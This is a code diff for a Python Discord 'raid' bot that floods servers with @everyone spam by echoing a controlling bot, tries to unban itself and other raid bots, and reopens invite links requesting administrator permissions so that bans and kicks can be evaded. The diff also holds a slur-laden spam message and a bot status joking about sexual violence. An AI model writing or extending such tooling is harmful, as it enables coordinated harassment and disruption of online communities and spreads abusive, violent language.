@@ -2,39 +2,62 @@ import discord
 import random
 import os
 from six.moves import configparser
+import webbrowser
 
-payload = '@everyone\n<@250803093049049089><@254683345735254016><@347507600541089793><@347735227055210496>\nhttps://media.giphy.com/media/PqXQV58Tva7DO/giphy.gif\nhttps://media.giphy.com/media/hLx1RYpEamdj2/giphy.gif\nhttps://media.giphy.com/media/xARspuzI2RZCw/giphy.gif\nhttps://media.giphy.com/media/11hEdGzcUswSEU/giphy.gif\nhttps://media.giphy.com/media/2qADsl3oMNtsc/giphy.gif\n**ITS SPAM TIME MY NI:b::b:AS**'
-notify = True
-counter = 0
+auditMsg = ''
+avatars = [ 'child0.png', 'child1.png' ]
 
 bot = discord.Client()
+bot.raid = False
+bot.counter = 0
 
 @bot.event
 async def on_ready():
     print('API connected!')
 
     print('Setting icon and name...')
-    file = open('icon.png', 'rb')
+    file = open(random.choice(avatars), 'rb')
     try:
         await bot.user.edit(username='Squidward Child', avatar=file.read())
     except:
         pass
 
+    print('Setting status message...')
+    await bot.change_presence(game=discord.Game(name='server gang-rape'))
+
     print('Ready to spam!')
 
 @bot.event
 async def on_message(message):
-    if message.author.bot:
-        if notify:
-            print('Spam has bugun.')
-            notify = not notify
+    if message.author.id == 466016028812509186:
+        if not bot.raid:
+            print('=== Spam has bugun ===')
+            bot.raid = not bot.raid
         if message.mention_everyone:
-            counter += 1
-            if counter % 100:
-                print('All the bots total have spammed @everyone ' + counter + ' times!')
-        await message.channel.send(payload)
+            bot.counter += 1
+            if bot.counter % 100:
+                print('All the bots total have spammed @everyone ' + bot.counter + ' times!')
+        await message.channel.send(message.content)
 
-filename = "bot.cfg"
+@bot.event
+async def on_member_ban(banGuild, user):
+    if bot.raid:
+        try:
+            await banGuild.unban(user, reason=auditMsg)
+        except:
+            pass
+        if user.bot:
+            print('A bot was banned! I have unbanned it. Please re-invite ASAP:    https://discordapp.com/api/oauth2/authorize?client_id=' + str(user.id) + '&permissions=0&scope=bot')
+            webbrowser.open('https://discordapp.com/api/oauth2/authorize?client_id=' + str(user.id) + '&permissions=8&scope=bot', new=0, autoraise=True)
+
+@bot.event
+async def on_member_remove(member):
+    if bot.raid:
+        if member.bot:
+            print('A bot was kicked! Please re-invite ASAP:    https://discordapp.com/api/oauth2/authorize?client_id=' + str(member.id) + '&permissions=0&scope=bot')
+            webbrowser.open('https://discordapp.com/api/oauth2/authorize?client_id=' + str(member.id) + '&permissions=8&scope=bot', new=0, autoraise=True)
+
+filename = "childbot.cfg"
 if os.path.isfile(filename):
     config = configparser.ConfigParser()
     config.read(filename)
